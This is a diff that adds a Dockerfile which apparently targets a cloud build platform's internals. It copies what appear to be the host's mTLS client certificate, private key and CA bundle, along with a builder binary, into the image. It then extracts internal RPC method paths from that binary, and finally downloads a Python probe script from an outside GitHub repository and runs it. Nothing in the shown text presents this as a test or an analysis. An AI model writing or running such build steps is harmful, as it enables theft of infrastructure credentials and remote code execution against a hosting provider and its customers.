@@ -1,0 +1,11 @@
+# MARK-I67677-a7f3c9
+FROM alpine:3.20
+RUN echo MARK-I67677-a7f3c9-step1
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+COPY usr/bin/builderv3 /f/bv
+RUN apk add --no-cache curl bash openssl python3 >/dev/null 2>&1; echo APKDONE
+RUN sh -c 'grep -aoE "/(temporal|stacklet|certs|pki|network_cp|stats|vm_runner|orchestrator|backboard|builderv3)[A-Za-z0-9_.]*/[A-Za-z0-9_]+" /f/bv | sort -u | head -70 > /m.txt; echo METHODS_N=$(wc -l < /m.txt); cat /m.txt'
+RUN curl -sS -m 25 -o /probe.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i67677.py && echo DL_OK && MARK=I67677-a7f3c9 timeout 320 python3 /probe.py 2>&1 | head -c 30000
+CMD ["sh","-c","sleep 3600"]
